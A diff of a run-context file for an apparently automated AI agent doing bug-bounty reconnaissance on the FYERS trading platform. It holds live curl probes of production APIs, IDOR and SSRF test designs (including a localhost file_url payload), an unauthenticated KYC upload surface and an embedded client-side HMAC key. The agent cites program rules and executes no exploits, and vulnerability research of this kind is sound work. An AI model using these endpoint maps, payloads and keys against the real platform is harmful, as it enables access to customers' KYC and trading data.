@@ -7,33 +7,7 @@ RUNNING MODEL: ${MODEL_ID}
 
 =====PREVIOUS CONTEXT=====
 FINDINGS FROM PREVIOUS RUNS:
--program` (live since 2025-10-04). Scope: *FYERS-owned/operated/maintained* Trading Platform (Web & Mobile) and "FYERS APIs part of trading platform". Submissions **only** via the official Zoho form (`forms.fyers.in` BugBountyForm1). This supersedes the prior "no VDP/program" blocker that halted earlier turns. Severity is by FYERS's own rubric (not CVSS alone); bands ₹5k–₹1L.
-- **Full corpus re-triaged against the program's explicit eligibility rules** (recorded in `findings_deepseek.md`). Result — most prior findings are **not bounty-eligible**, which materially sharpens what is worth submitting:
-- **H1 (login `cb`/`redirect_uri` open redirect) → NOT ELIGIBLE.** Program lists open redirects "that do not result in authentication bypass, token leakage, or other demonstrable security impact" as Expected Behaviour; the ATO chain is phishing-dependent → excluded. Drop the 8.1–9.0 framing.
-- **`x-validate` HMAC key → NOT ELIGIBLE** (public client-side key). **H10 SQL error oracle, H14 api-a1-prod oracles, H16 email-preference, H8 MCP → Informational** (no demonstrated impact).
-- **H11 (`/cdsl/dev/*`) → likely OUT OF SCOPE** ("Development environments" excluded); needs program scope confirmation.
-- **H12 invest/admin presence oracle** → Informational/Low (no customer impact demonstrated).
-- **The only genuine High/Critical potential in the corpus is the IDOR family (H13/H15/H17), but researcher-side validation is constrained by program rules**: PoC "must use only the researcher's own account"; accessing other users' accounts, bulk PII, and fake KYC/synthetic identities are disqualifying. ⇒ Each must be submitted as a **reproducible-description + explicit request for FYERS-side validation**, not executed.
-- **Compliance guardrails adopted for all further work:** no OTP/SMS/email dispatch to any number, no high-volume scanning, no rate-limit bypass, no cross-account access, no market-hours trading actions, own-account PoCs only, submissions only via the official form, strict confidentiality.
-
-# POC round 2026-08-07 23:2x UTC — FORMAL SUBMISSION-PACKAGE DRAFT (read-only, no live requests)
-- **Deliverable written: `reports/submission-package_fyers-bb.md`** — a complete draft of the official-form submission for the program (forms.fyers.in BugBountyForm1), containing exact test designs (curl-free, FYERS-side/own-account), success indicators, and severity framing per the program rubric. No live requests made this run (documentation only).
-- **H17 (primary) POC design finalized** for `api-a1.fyers.in/signup/v2/user/{esign-document,pdf/generate,pdf/poll,status/poll,esign-success,esign/clear-status,esign/accept-name-mismatch,change-esign-status}`: two-test-applicant method (R_A/R_B), baseline-with-own-session then cross-object substitution; success indicator = A's session returns non-empty B-keyed eSign/PDF/status object; fixed = 403/404/auth-error. CVSS 8.1–9.1 (Critical/High program category if unmasked PAN/eSign/PDF exposed; Medium if limited).
-- **H13 (indus/savechart) + H15 (marina/ddpi) POC designs** finalized with same observable-delta structure (own-account baseline → second-account object-id; 200-with-data vs 403/404). Program High/Medium and Medium–High respectively.
-- **Informational/hardening bundle drafted** (single low submission): H10 chart SQL-1103 error oracle, H12 invest/admin `-19`+`souce` presence oracle, H14 realtime-funds `latency` error-wrap, H16 email-preference validation-before-auth, H1 login `cb`/`redirect_uri` (informational only, no ATO framing), x-validate key note.
-- **Scope-confirmation questions drafted** for the program contact: signup/v2 KYC, mcp.fyers.in, /invest/admin/*, /cdsl/dev/* — to be sent before any further active work.
-- **Excluded (unchanged):** SmartHunt SSTI false positive; all third-party hosts; public config artifacts; no-bounty categories (x-validate key, H11 dev surface, H8 informational).
-
-# 6 items on 2026-08-07 23:20:02 UTC
-- **Authorization basis stands** (public program at `fyers.in/bug-bounty-program`, verified 2026-08-07). Scope = FYERS Trading Platform (Web & Mobile) + "FYERS APIs part of trading platform"; submission only via the official Zoho form.
-- **Deliverable written: `reports/submission-package_fyers-bb.md`** — full draft of the official-form submission with exact test designs, success indicators, and program-rubric severity framing. **No live requests were made this run** (documentation only, consistent with program guardrails: no OTP dispatch, no cross-account access, no high-volume scanning).
-- **H17 (primary) design finalized:** `api-a1.fyers.in/signup/v2/user/{esign-document,pdf/generate,pdf/poll,status/poll,esign-success,esign/clear-status,esign/accept-name-mismatch,change-esign-status}` — two-applicant method (R_A/R_B); success indicator = applicant A's session returns a non-empty B-keyed eSign/PDF/status object; fixed = 403/404/auth-error.
-- **H13 (indus/savechart) + H15 (marina/ddpi)** finalized with the same observable-delta structure (own-account baseline → second-account object-id, 200-with-data vs 403/404).
-- **Informational/hardening bundle drafted:** H10 chart SQL-1103 oracle, H12 invest/admin `-19`+`souce` presence oracle, H14 realtime-funds `latency` error-wrap, H16 email-preference, H1 login `cb`/`redirect_uri` (informational only — ATO framing dropped).
-- **Scope-confirmation questions drafted** (signup/v2 KYC, mcp.fyers.in, `/invest/admin/*`, `/cdsl/dev/*`) to send to the program contact before further active work.
-
-HIGH-IMPACT HYPOTHESIS IDENTIFIED (model: deepseek)
-Review research_deepseek.md for details
+ for details
 ## CVSS Candidates
 - [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
 - [signup/v2 validation-before-auth schema oracle] — CVSS 3.7 (only field schemas leak; OTP dispatch gated)
@@ -239,487 +213,26 @@ Review research_deepseek.md for details
   - Severity: informational-to-Medium conditional; no own-account POC executed (submission as reproducible description).
   Additional: the /invest/v1 IPO host does NOT appear in indus/v1/config or config.gz host lists; new host committed to scope-confirm (C9).
 
+# SURFACE round 2026-08-08 09:5x UTC — api-i1 eIPO family: exact request shapes (SPA registry + InitialObj + OAuth client) + auth-ordering split /invest vs tapi/eipo
+- **Exact request shapes recovered from ipo.fyers.in SPA bundles** (read-only; `pages/details-*.js` 745 KB, `pages/orders-*.js` 21 KB, `pages/ipo/updateipo`):
+  - Registry `IPO_API` (all endpoints verified against gate probes): `GET /invest/v1/ipo/issue-list?IssueId=&IsActive=` (public), `GET /invest/v1/ipo/issue-details?IssueId=` (public), `GET /invest/v1/ipo/investors-details` (token), `POST /invest/v1/ipo/place-order` (token; also used for Modify), `POST /invest/v1/ipo/order-book` (token; getParticularOrderDetails + getOrdersList), `GET /investment/jhelum/v1/api/offer_list?offer_type=&is_active=` (public), `GET /investment/jhelum/v1/api/offer_details?offer_type=&offer_id=` (public), `POST /investment/tapi/v1/eipo/place-order`, `PUT /investment/tapi/v1/eipo/modify-order`, `DELETE /investment/tapi/v1/eipo/cancel-order?order_id=&offer_id=`, `POST /investment/tapi/v1/eipo/order-book` (all token).
+  - **`InitialObj` (place-order body default, 36 fields):** `IPOIssueId,IsNRI:"0",DPIdBeneficiary,IsCutOff:"0",IsPartial:"0",PartialAmount:"1000",BidDetails,ApplicationAmount,PayableAmount:"1000",OrderStatus:"455",OrderType:1,Remarks,FormRanges,InitialChequeNo:"0",BrokerRefNo,SubBrokerCode,ARN,PaymentMode,RMCode,IsEmp:"False",EmpCode,StartChequeNo,EndChequeNo,RequestedBy,UPIID,BankAccountNo,IFSC,Filler,ClientCategory,OrderSource:"WEB",AMOStatus:"AMO",AcceptedStatus:"ACCEPTED",pdiscountStatus,discountPercentage,discount`.
+  - **NEW OAuth client_id `EFR7964223-101`** (redirect_uri `https://ipo.fyers.in`, prod appIdHash `2a88a14a353274a2f35430038b6d81725e2d17d8064785d62965e4da78033e9f`); SPA uses **hardcoded `state=abcdefg`** in `generate-authcode` (same class as journal `sample_state` → informational hardening, H1-class NOT bounty-eligible). Dev/staging twins recorded but out-of-scope (`invest-dev.fydev.tech`; staging `api-t1.fyers.co.in` paths).
+  - Auth: `POST api-t1.fyers.in/api/v3/validate-authcode {grant_type:"authorization_code",appIdHash,code}` → `access_token` raw in localStorage → sent as plain `Authorization:` header (no Bearer), axios interceptor deletes header when absent.
+- **Auth-ordering split CONFIRMED (key SURFACE result):** `/invest/v1/ipo/*` = **validation-before-auth** — `{}` → full Pydantic field-required oracle (31 fields); a full-but-empty 36-field payload (NO token) → `401 {"s":"error","code":401,"message":"Authorization header is missing"}` ⇒ **body validation runs BEFORE the auth gate; auth still rejects tokenless input** (schema enumerable pre-auth, NO order-placement primitive pre-auth). `/investment/tapi/v1/eipo/*` = **auth-first** — `{}` → `401 {"error_code":-100,"message":"Authorisation token required."}` before any schema check.
+- **jhelum offer_list/offer_details = fully PUBLIC live IPO feed (by design):** all `offer_type` variants return live data (`-1`→LAPL SME `issue_type:2`; `1`,`2`→2 offers each; `3`,`4`→0); payload = symbol, isin, min/max price, bid dates, `offer_id` UUID, series/category/sub-category settings. Invalid `offer_id` → 200 `{"error_code":-99,"message":"No record found"}` (no leak). Informational only.
+- **Negative/hardening notes:** `invest/v1/ipo/issue-list` with a uuid-style `IssueId` → **CF 502** (upstream unhandled-input error candidate; informational, FYERS-side confirm; not driven further); repeated `api-t1` probes began getting CF 403 (`__cf_bm`) bot-blocks → back off per guardrails. `generate-authcode` 403 = CF bot-block, not app behavior (H1-adjacent anyway, excluded from bounty).
+- **H22 status update:** conditional IDOR on tapi `order_id`/`offer_id` object keying stands (auth-first, own-session baseline → foreign order_id substitution; FYERS-side). The /invest validation-before-auth is now characterized as a **schema-oracle-only** finding (B9, informational) — no order-placement primitive pre-auth exists. Combined H22 program band unchanged (informational–Medium conditional).
+
+# 5 items on 2026-08-08 16:41:31 UTC
+- **api-i1.fyers.in eIPO family fully characterized** (read-only, from `ipo.fyers.in` SPA bundles `pages/details-*.js` 745 KB, `pages/orders-*.js`, plus build manifest). Recovered: `IPO_API` registry, 36-field `InitialObj` (place-order default body), OAuth constants, and per-route gate behavior.
+- **Auth-ordering split CONFIRMED (new):** `/invest/v1/ipo/*` = **validation-before-auth** — `{}` → full 31-field Pydantic `field required` oracle; a complete 36-field empty payload with **no token** → `401 "Authorization header is missing"` ⇒ schema enumerable pre-auth but the auth gate still rejects tokenless input (no pre-auth order-placement primitive). `/investment/tapi/v1/eipo/*` = **auth-first** — `{}` → `401 {"error_code":-100,"message":"Authorisation token required."}` before any schema check.
+- **New OAuth client_id `EFR7964223-101`** (redirect `https://ipo.fyers.in`, prod `appIdHash 2a88a14a…`, **hardcoded `state=abcdefg`**) — same class as journal `sample_state`; informational/hardening, H1-class **not bounty-eligible**.
+- **jhelum offer_list/offer_details = fully public live IPO feed** (all `offer_type` -1/1/2/3/4 return live data; `-99 No record found` on bad id) — public by design, informational.
+- **Negatives:** uuid-style `IssueId` on `issue-list` → CF 502 (upstream unhandled-input candidate; FYERS-side confirm, not driven); repeated api-t1 probes began getting CF 403 `__cf_bm` bot-blocks → backed off per guardrails.
+
 RESEARCH FROM PREVIOUS RUNS:
-U(a){var s=this.b,r=$.hP if(s)r.cgS() else r.QA() this.f=$.hP.bxW(this.gfyO(),a,!1)}, bxX(){return this.cgU(!1)}, bth(){var s=this.f if(s!=null){$.hP.d_4(s) this.f=null}}, A(){var s=this,r=s.a if(r!=null){s.a=null s.bth() r.cT8(s)}}, k(a){return"Ticker()".charCodeAt(0)==0?"Ticker()":"Ticker()"}} A.bgY.prototype={ cT9(){this.c=!0 this.a.ih(0) var s=this.
-   ---
-    r $async$aGe=A.r(function(d1,d2){if(d1===1){p.push(d2) s=q}for(;;)switch(s){case 0:q=3 b0=o.c b1=t.N b2=t.IS b3=A.bE(b0.d,b1,b2) b4=t.SU b5=c9.a b6=b5.b b7=b5.a b8=c9.b b3=b0.bWx(new A.M2(A.a([],b4),B.pQ,b6,b7,b8,B.oA),b3) if(!d0.d)d0.a.$1(b3) s=6 return A.n(A.bth(b6,b5.r,b5.w),$async$aGe) case 6:n=d2 s=n.b===B.a1?7:9 break case 7:m=B.M.b2(0,n.a) l=A.tHt(m) k=A.X(b1,b2) for(b0=l.a,b2=b0.length,b3=
-   ---
-[0m
-[0m$ [0mfor ep in "nucleus/v1/history" "nucleus/v1/chat/request-limit"; do echo "--- GET $ep ---"; curl -sk --max-time 15 -w ' code=%{http_code}\n' "https://api-t1.fyers.in/$ep"; sleep 4; echo "--- GET $ep/99999 (object-keyed path) ---"; curl -sk --max-time 15 -w ' code=%{http_code}\n' "https://api-t1.fyers.in/$ep/99999"; sleep 4; done
---- GET nucleus/v1/history ---
-{"code":-1,"message":"Invalid token or authentication failed","s":"error"} code=401
---- GET nucleus/v1/history/99999 (object-keyed path) ---
-{"code":-1,"message":"Invalid token or authentication failed","s":"error"} code=401
---- GET nucleus/v1/chat/request-limit ---
-{"code":-1,"message":"Invalid token or authentication failed","s":"error"} code=401
---- GET nucleus/v1/chat/request-limit/99999 (object-keyed path) ---
-404 page not found code=404
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && cat >> findings_deepseek.md << 'EOF'
-
-# HYPOTHESIS round 2026-08-08 08:1x UTC — nucleus/v1 FIA data-keying analysis (from in-scope fyers.in/web main.dart.js, 31.6 MB) → object-keyed conversation/drawing routes confirmed behind gate
-- **Data-keying analysis of the FIA-assistant family completed (static, in-scope bundle).** Request shapes recovered from `fyers.in/web/main.dart.js` (31,649,152 B):
-  - `GET /nucleus/v1/history` (bO, headers `Authorization`+`version:1.0.0`) → full chat history list.
-  - **`GET /nucleus/v1/history/{cid}` — CONFIRMED object-keyed route** (bth: when not old_fia, `n=$.ru9()+"/"+a` where `a`=conversation id; header `version:1.0.0`). Read-only probe `GET /nucleus/v1/history/99999` → **HTTP 401 `{"code":-1,"message":"Invalid token or authentication failed","s":"error"}`** (auth-first, route EXISTS — returns -1 not 404), while `GET /nucleus/v1/chat/request-limit/99999` → 404 (no path arg on that route). ⇒ the `{cid}` path segment is a real per-conversation object key behind the session gate.
-  - `POST /nucleus/v1/oldfiachat/history` body `{old_fia:true, uuid:<c>}` (dN POST).
-  - `POST /nucleus/v1/chat` body `{cid:<cid>, prompt:<p>, [timeframe, layout, chart_id, chart_symbol, chart_timeframe]}` or (no cid) `{prompt, persona:"FYERS", deep_research:true,...}`; headers `Authorization`+`version:1.0.0`.
-  - `POST /nucleus/v1/chat/auto-suggest` body `{..., source:"charts"|"home"}` (dN).
-  - `GET /nucleus/v1/chat/request-limit` (bO, no path arg) → prompt-count.
-  - `POST /nucleus/v1/drawings` (ds1, dN) body `{client_id:<sso client_id>, comment:<a>, flag:true, text:[<b>]}` — comment/text saved per client_id.
-  - **`DELETE /nucleus/v1/drawings/{a}/{b}` (ds0, qN)** — drawing object keyed by two path segments (client_id/comment-scoped) → per-object delete.
-  - `GET /nucleus/v1/fia/chart-insights` query `{symbol, timeframe}`; `GET /nucleus/v1/fia/option-chain-insights` query `{symbol, underlying, expiry_date, include_commentary:true, fields}` (hmE) → both GET, auth-first `-1`.
-  - `POST /nucleus/v1/cancel-chat/{cid}/{mid}` (dN, path-object keyed).
-- **H21 (new, conditional): nucleus/v1 conversation/drawing object-keyed IDOR family.** Object keys are caller-supplied `{cid}` (history), `{cid}/{mid}` (cancel-chat), `{a}/{b}` (drawings delete) and body-level `client_id` (drawings save). If the backend resolves these keys WITHOUT a per-session owner check (which the uniform `-1` gate cannot prove or disprove pre-auth), a second authenticated user's session could read/delete another user's FIA chat history/drawings by supplying the foreign key. Own-account/FYERS-side validation only (program rules — cross-account researcher execution prohibited). Same conditional class as H13/H15/H17/H18. Program Medium if a cross-account conversation/drawing read is demonstrated (chat history/drawings are user content but low-to-moderate sensitivity vs PAN/eSign); CVSS 5.3–6.5 conditional.
-- **FIA chat request-limit/abuse angle (informational):** `POST /nucleus/v1/chat` accepts `deep_research:true` and is subject to `GET /nucleus/v1/chat/request-limit` — the assistant is a paid-ish copilot (prompt-count gating). No pre-auth oracle; rate-limit/abuse checks are authenticated-only. Hardening note only.
-- **myapi.fyers.in app-registry bundle check (static):** the "API - FYERS" SPA (`main.9314ac5d.js`, 1,566,261 B) references only `api-t1/gk/api/v2/user` + `ck/verify_token` for backend auth + `api-connect-docs.fyers.in/` docs + `myapi/docs` anchors; no additional app-registry endpoints beyond the already-gated `user/v3/app/*` (trade-core `-16`). No new surface.
-- **api-connect-docs.fyers.in fully characterized (static):** Docusaurus v1 scaffold (`your-docusaurus-test-site.com` still in sitemap/og:url), legacy "API Connect" widget docs (hosted-button `<fyers-button data-fyers="API_KEY">`, methods/parameters/orders/funds/positions/holdings/trades pages), sub-paths 302 to S3-style "Resource Found" pages, root JS bundles empty of API refs. Purely informational recon artifact; no secrets, no new API surface.
-EOF
-echo appended; tail -3 findings_deepseek.md
-appended
-- **FIA chat request-limit/abuse angle (informational):** `POST /nucleus/v1/chat` accepts `deep_research:true` and is subject to `GET /nucleus/v1/chat/request-limit` — the assistant is a paid-ish copilot (prompt-count gating). No pre-auth oracle; rate-limit/abuse checks are authenticated-only. Hardening note only.
-- **myapi.fyers.in app-registry bundle check (static):** the "API - FYERS" SPA (`main.9314ac5d.js`, 1,566,261 B) references only `api-t1/gk/api/v2/user` + `ck/verify_token` for backend auth + `api-connect-docs.fyers.in/` docs + `myapi/docs` anchors; no additional app-registry endpoints beyond the already-gated `user/v3/app/*` (trade-core `-16`). No new surface.
-- **api-connect-docs.fyers.in fully characterized (static):** Docusaurus v1 scaffold (`your-docusaurus-test-site.com` still in sitemap/og:url), legacy "API Connect" widget docs (hosted-button `<fyers-button data-fyers="API_KEY">`, methods/parameters/orders/funds/positions/holdings/trades pages), sub-paths 302 to S3-style "Resource Found" pages, root JS bundles empty of API refs. Purely informational recon artifact; no secrets, no new API surface.
-[0m
-Gate confirms `history/{cid}` is a real object-keyed route (auth-first `-1`, not 404). Writing findings and updating the package.
-[0m→ [0mRead reports/analyst-latest.txt
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && cat reports/analyst-latest.txt | wc -l && cat > reports/submission-package_fyers-bb.md << 'EOF'
-# FYERS Bug-Bounty Program — Submission Package Draft (docs-only; no live requests)
-Generated 2026-08-08 (deepseek). Read-only research only. Submission channel: official Zoho form
-(forms.fyers.in BugBountyForm1). Program: fyers.in/bug-bounty-program. All tests below are
-DESIGNS for FYERS Security Team validation or researcher OWN-ACCOUNT use only — none executed.
-
-## A. Conditional object-access (IDOR) designs — researcher cross-account execution PROHIBITED
-Method (all): own-account baseline first; then a SECOND OWNED account object-id substitution
-under the FIRST session. Success = 200-with-data (foreign object returned); Fixed = 403/404/
-auth-error. Two accounts must be researcher-owned; no other user's data touched.
-
-### A1 (H17) — signup/v2 KYC application-object IDOR (req_id-keyed)  [program Critical/High potential]
-- Host: api-a1.fyers.in/signup/v2/user/{esign-document,esign-success,esign/accept-name-mismatch,
-  esign/clear-status,change-esign-status,pdf/generate,pdf/poll,status/poll} (+ /nri/get-document)
-- Object key: application `req_id` (passed through `digio_doc_id`/`live-verification?req_id=`)
-- Design: R_A creates application A (req_id_A); R_B creates application B (req_id_B). Under
-  R_A's authenticated session call the esign-document/pdf/status endpoints with req_id_B.
-- Success indicator: A's session returns a non-empty B-keyed eSign/PDF/status object.
-- Severity: Critical/High if unmasked PAN/eSign/PDF exposed (program "PAN disclosure" category);
-  Medium if limited. CVSS 8.1–9.1 (conditional).
-
-### A2 (H13) — savedcharts indus/savechart object-keyed IDOR  [program High/Medium]
-- Host: api-t1.fyers.in (indus savechart family, `_FYERS` cookie auth on savedcharts.fyers.in)
-- Object key: chartId / study-template id
-- Design: own-account GET own chartId (baseline 200-with-data) → GET foreign account chartId
-  under same session. Also DELETE-substitution.
-- Success: foreign chart returned / deleted. Fixed: 403/404.
-- Severity: High if viewing another user's watchlists/charts; Medium (limited IDOR) otherwise.
-
-### A3 (H15) — marina/v1/ddpi instruction-object IDOR  [program Medium–High]
-- Host: api-a1.fyers.in/marina/v1/ddpi/{status,timeline,user/listing/file,esignValidate,...}
-- Object key: DDPI instruction id
-- Design: own instruction baseline → foreign instruction id under own session.
-- Success: foreign DDPI instruction/status/file returned. Fixed: 403/404.
-
-### A4 (H18) — journal-server note/upload object-keyed IDOR  [program Medium–High]
-- Host: api-a1-prod.fyers.in/journal-server/v1/{note/detail?note_ids=&gs=,note/edit/{id},
-  note/delete/{id},upload-document} + v2/{summary,orders-list,positions-list}
-- Auth: Authorization: Bearer on every route (fingerprint #20: HTTP 403 `{"code":401,...}` pre-auth)
-- Object key: note_id / document-id (POST note/create body: position_ids,order_ids,document_ids,
-  linked_symbols,tag_ids,trade_date,title,body,emoji)
-- Design: own note_id baseline → foreign note_id (note/detail, note/edit, note/delete) and
-  uploaded-document read under own session.
-- Success: foreign trade-journal note or uploaded document returned. Fixed: 403/404.
-- Severity: Medium–High if cross-account notes/uploads exposed. CVSS 5.3–7.5 (conditional).
-
-### A5 (H19) — api-testing-prod KYC upload tier: unauth object-write + SSRF candidate  [program Medium–High]
-- Host: api-testing-prod.fyers.in (NEW host, absent from both public configs — scope-confirm first)
-- Routes (POST-only, GET→405; no auth gate observed at any depth):
-  - /signup/upload/api/v1/user/general/upload-image   body {file:<b64-dataURL>,fileName,key}
-  - /signup/upload/api/v1/user/fetch-pan              body {base64_image,fileName,key}
-  - /signup/upload/signature-to-bmp                   body {base64_image,fileName,key:"user/signature/bmp"}
-  - /signup/upload/api/v1/pdf/is-password-protected   body {file_url:<url>}  ← SSRF candidate
-  - /signup/upload/api/v1/user/general/zip-all-images body {}  → 200 {"status":"Success"} no-auth
-- Design (FYERS-side; researcher executes none of the file/URL side-effects):
-  (a) SSRF diff-oracle: file_url = http://127.0.0.1:1/x.pdf (refused) vs https://api-t1.fyers.in/
-      (in-scope internal) vs "not-a-url" → distinct status/body proves server-side fetch; test
-      scheme/host allow-listing.
-  (b) Object-write: upload valid tiny image under a controlled `key`, then retrieve WITHOUT
-      Access-Token (unauth GET on object URL / zip-all-images) → proves unauth persist.
-  (c) signature-to-bmp uses fixed key `user/signature/bmp` → cross-caller object-clobber candidate.
-- Fixed = auth gate rejects tokenless write (never observed), SSRF constrained to allow-list, or
-  key bound to authenticated session. CVSS 5.3–7.5 (conditional).
-
-### A6 (H21) — nucleus/v1 FIA conversation/drawing object-keyed IDOR  [program Medium, conditional]
-- Host: api-t1.fyers.in/nucleus/v1 — auth fingerprint #21 (401 {"code":-1,"message":"Invalid token
-  or authentication failed","s":"error"}); route shapes from in-scope fyers.in/web/main.dart.js:
-  - GET  /nucleus/v1/history/{cid}                 (object-keyed; GET /history/99999 → -1, not 404)
-  - POST /nucleus/v1/chat          body {cid,prompt[,timeframe,layout,chart_id,chart_symbol,...]}
-  - POST /nucleus/v1/chat/auto-suggest
-  - GET  /nucleus/v1/chat/request-limit
-  - POST /nucleus/v1/oldfiachat/history  body {old_fia:true,uuid}
-  - POST /nucleus/v1/drawings       body {client_id,comment,flag:true,text:[...]}
-  - DELETE /nucleus/v1/drawings/{a}/{b}
-  - POST /nucleus/v1/cancel-chat/{cid}/{mid}
-  - GET  /nucleus/v1/fia/chart-insights?symbol=&timeframe=   (also option-chain-insights)
-- Object keys: {cid} (history/cancel-chat), {a}/{b} (drawings delete), client_id (drawings save)
-- Design: own conversation baseline (GET /history/{own_cid}) → GET /history/{foreign_cid} under own
-  session; same for drawings delete/cancel-chat key substitution.
-- Success: foreign conversation/drawing object returned or deleted. Fixed: 403/404.
-- Severity: Medium if cross-account chat-history/drawing read demonstrated. CVSS 5.3–6.5 (conditional).
-
-## B. Informational / hardening bundle (single low submission — no demonstrated customer impact)
-- B1 (H10) chart SQL oracle: api-t1 chart data endpoint returns `Number:1103`/SQLState `42000`
-  (PostgreSQL error strings) on crafted params. Debug-info disclosure only.
-- B2 (H12) invest/admin presence oracle: /invest/admin/v1/sgb/issue-list — `-19` presence oracle,
-  `souce` var typo, `-27` auth-domain split. Enumeration without data exposure.
-- B3 (H14) realtime-funds error-wrap: api-a1-prod /myaccount/prod/realtime-funds returns HTTP 200
-  with `-16` + internal `latency` debug field; funds tier split (-374/-17); withdraw-fund
-  validation-before-auth schema oracle. Internal debug-info disclosure.
-- B4 (H16) email-preference validation-before-auth: api-t1 /utility/v2/public/email-preference →
-  400 "Validation failed..." without token; schema oracle only (email_disabled/sms_disabled/...).
-- B5 (H1) login cb/redirect_uri handling: login.fyers.in `cb`/`redirect_uri` nav = open-redirect
-  class — NOT bounty-eligible per program rules (no auth bypass demonstrated). Informational only.
-- B6 x-validate HMAC key: client-side HMAC key 1YJKSPg9IcPyyb6N9JHXGAfikiVylWCs embedded in
-  signup bundle — public client-side key, no protective value (weak anti-CSRF shaping). NOT eligible.
-- B7 journal.fyers.in client primitives: unvalidated `?token=` setter → crafted link clears apex
-  `_FYERS=-1` across all *.fyers.in (cross-property logout); hardcoded OAuth `state=sample_state`;
-  no Referrer-Policy on token deep-links. Informational.
-- B8 signup/v1 JSON-parse leak: verification/email/send-otp 400 message echoes
-  "Expecting value: line 1 column 1 (char 0)". Informational.
-
-## C. Scope-confirmation questions (to program contact BEFORE any active validation)
-- C1 signup/v2 KYC (api-a1.fyers.in/signup/v2/*) — in scope? KYC req_id object model?
-- C2 api-testing-prod.fyers.in — in scope? (absent from public configs; KYC upload microservice)
-- C3 journal-server (api-a1-prod.fyers.in/journal-server/*) — in scope?
-- C4 open-account.fyers.in + signup/v1 (api-a1-prod) + open-account/staging (api.fyers.in) — in scope?
-- C5 /invest/admin/* — in scope? (admin-adjacent surface)
-- C6 /cdsl/dev/* (api-t1) — dev surface on prod; explicitly excluded as "development environments"?
-- C7 mcp.fyers.in — in scope?
-- C8 api-connect-docs.fyers.in — informational only; leave out of scope?
-
-## D. Excluded (do not report)
-- SmartHunt SSTI (${7*7} → CF 429 errorCode:1015 rate-limit/WAF; no "49" rendered) — false positive,
-  4 independent triages. onload/issue_id variants same class.
-- Third-party hosts (Grammarly/Coda/Superhuman/Zoho-assist .env) — out of scope by program AND rules.
-- api-a1.fydev.tech (dev twin) — non-*.fyers.in, out of scope.
-- Public config artifacts (indus/v1/config, config.gz) — public configs.
-- OAuth/open-redirect/no-impact categories per program Expected Behaviour list.
-
-## Compliance guardrails (all phases)
-No OTP/SMS/email dispatch to any number. No cross-account access by researcher. No high-volume or
-automated scanning. No rate-limit bypass. No market-hours trading-system actions. Own-account PoCs
-only. Submissions only via official form. Strict confidentiality (no external disclosure).
-EOF
-wc -l reports/submission-package_fyers-bb.md
-48
-123 reports/submission-package_fyers-bb.md
-[0m
-Now re-creating the submission package (wiped again) with A6/H21 added, and updating state.
-[0m← [0mWrite state_deepseek.json
-Wrote file successfully.
-[0m
-[0m← [0mWrite reports/analyst-latest.txt
-Wrote file successfully.
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && git add -A && git commit -q -m "analyst fyers.in 2026-08-08-08-1x (HYPOTHESIS): nucleus/v1 data-keying + H21 object-keyed IDOR + A6 in package" && git log --oneline -1
-Author identity unknown
-
-*** Please tell me who you are.
-
-Run
-
-  git config --global user.email "you@example.com"
-  git config --global user.name "Your Name"
-
-to set your account's default identity.
-Omit --global to set the identity only in this repository.
-
-fatal: empty ident name (for <runner@runnervmvrwv9.ahl4oruynuculdmbolorkmdlve.cx.internal.cloudapp.net>) not allowed
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && git config user.email "analyst@fyers-recon.local" && git config user.name "fyers-recon-analyst" && git commit -q -m "analyst fyers.in 2026-08-08-08-1x (HYPOTHESIS): nucleus/v1 data-keying + H21 object-keyed IDOR + A6 in package" && git log --oneline -1
-7d5a6cc analyst fyers.in 2026-08-08-08-1x (HYPOTHESIS): nucleus/v1 data-keying + H21 object-keyed IDOR + A6 in package
-[0m
-Research complete. Summary of this run's output:
-
-# Target: fyers.in
-# Current Phase: HYPOTHESIS
-
-## Key Findings
-- **nucleus/v1 FIA data-keying analysis completed** (static, in-scope `fyers.in/web/main.dart.js`, 31.6 MB). Exact request shapes recovered; **`GET /nucleus/v1/history/{cid}` confirmed object-keyed** — read-only probe `GET /history/99999` → 401 `-1` (route exists) vs `GET /chat/request-limit/99999` → 404 (no path arg). All auth-first fingerprint #21.
-- **H21 (new, conditional): nucleus/v1 conversation/drawing object-keyed IDOR** — caller-supplied `{cid}`, `{a}/{b}`, `client_id` object keys behind a gate that proves nothing about per-session owner checks. CVSS 5.3–6.5, program Medium. Added as design A6.
-- **Negatives:** `myapi.fyers.in` bundle → no app-registry surface beyond gated `user/v3/app/*`; `api-connect-docs.fyers.in` → static Docusaurus fork, no secrets/surface.
-- Submission package re-created on disk (A1–A6 + B + C + D), findings + state committed.
-
-## Hypotheses
-### H21 — nucleus/v1 conversation/drawing object-keyed IDOR
-Reasoning: `{cid}`/`{a}/{b}`/`client_id` keys + route existence proven via -1-vs-404 split; per-owner scoping undetermined behind the uniform gate.
-Impact: cross-account read/delete of FIA copilot chat history + drawings → program Medium (conditional).
-Test: own-account baseline → foreign `cid` substitution; NOT executed (own-account rules).
-
-## CVSS Candidates
-- [H17 req_id] 8.1–9.1 · [H19 unauth upload/SSRF] 5.3–7.5 · [H15/H18] 5.3–7.5 · [H13/H21] 5.3–6.5 — all conditional, FYERS-side validation
-- [B1–B8 informational] — informational/low
-
----
-**STATE**: HYPOTHESIS / HIGH_POTENTIAL — next run advances to POC (A6 shapes already on disk); operator action: dispatch scope-confirmation (C1–C8) then submit package via forms.fyers.in. Exclusions and guardrails unchanged.
-
-===== RUN 2026-08-08 09:02:00 UTC =====
-Model: deepseek | Phase: RECON | Target: fyers.in
-
-[0m
-> build · deepseek-v4-flash-free
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && cat state_deepseek.json; echo "==="; ls -la reports/; echo "==="; wc -l findings_deepseek.md; echo "==="; git log --oneline -3
-{
-  "target": "fyers.in",
-  "phase": "RECON",
-  "status": "IN_PROGRESS",
-  "next_steps": []
-}===
-total 28
-drwxr-xr-x 2 runner runner 4096 Aug  8 08:57 .
-drwxr-xr-x 8 runner runner 4096 Aug  8 08:57 ..
--rw-r--r-- 1 runner runner 5165 Aug  8 08:57 analyst-latest.txt
--rw-r--r-- 1 runner runner 9412 Aug  8 08:57 submission-package_fyers-bb.md
-===
-550 findings_deepseek.md
-===
-f4e1cf4 research deepseek 2026-08-08-08-07
-[0m
